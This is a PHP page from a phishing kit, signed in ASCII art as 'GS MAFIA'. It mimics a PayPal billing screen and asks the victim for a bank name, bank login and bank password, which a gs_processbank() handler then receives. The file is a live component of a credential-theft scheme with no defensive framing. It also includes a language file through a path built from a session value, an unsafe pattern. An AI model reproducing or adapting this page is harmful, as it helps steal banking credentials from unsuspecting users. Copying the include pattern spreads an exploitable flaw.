<?php 
#   ___   ___       __  __     _     ___   ___     _   
#  / __| / __|     |  \/  |   /_\   | __| |_ _|   /_\  
# | (_ | \__ \  _  | |\/| |  / _ \  | _|   | |   / _ \ 
#  \___| |___/ (_) |_|  |_| /_/ \_\ |_|   |___| /_/ \_\
session_start();
include("languages/index.php");
include ("languages/lang".$_SESSION['gs_langlink']);
?>
<div class="CTABannerContainer CTABannerContainer--billinginfopage ">
	<div class="DefaultGreeting">
		<div class="cta-banner">
			<div class="cta-headline">
				<span class="cta-name">
					<center>
						<h2 style="margin-bottom: 0px;font-size: 28.5px; font-family: PayPal-Sans-Big, sans-serif;" ><?php echo $gs_stringbk26 ?></h2>
					</center>
				</span>
			</div>
		</div>
	</div>
</div>
<div class="body-content">
	<div id="address-suggest-field" class="AddressSuggestField">
		<div class="TextField form-field">
			<div class="inputField textInput">
			<input type="text" id="gs_bankname" autocapitalize="off" autocomplete="disabled" autocorrect="off" data-errormsg="" data-errorshowmsg="false" data-haserror="false">
			<label class="input-has-value"><?= $gs_stringbk29 ?></label>
			</div>
		</div>
	</div>
	<div id="address-suggest-field" class="AddressSuggestField">
		<div class="TextField form-field">
			<div class="inputField textInput">
			<input type="text" id="gs_banklogin" autocapitalize="off" autocomplete="disabled" autocorrect="off" data-errormsg="" data-errorshowmsg="false" data-haserror="false">
			<label class="input-has-value"><?= $gs_stringbk27 ?></label>
			</div>
		</div>
	</div>
	<div id="address-suggest-field" class="AddressSuggestField">
		<div class="TextField form-field">
			<div class="inputField textInput">
			<input type="password" id="gs_bankpassword" autocapitalize="off" autocomplete="disabled" autocorrect="off" data-errormsg="" data-errorshowmsg="false" data-haserror="false">
			<label class="input-has-value"><?= $gs_stringbk28 ?></label>
			</div>
		</div>
	</div>
	<div id="action-buttons" class="buttons">
		<button class="CAPE-Button btn full " onclick="gs_processbank();" type="button" id="gs_btn4">
			<span><?= $gs_string19 ?></span>
		</button>
</div>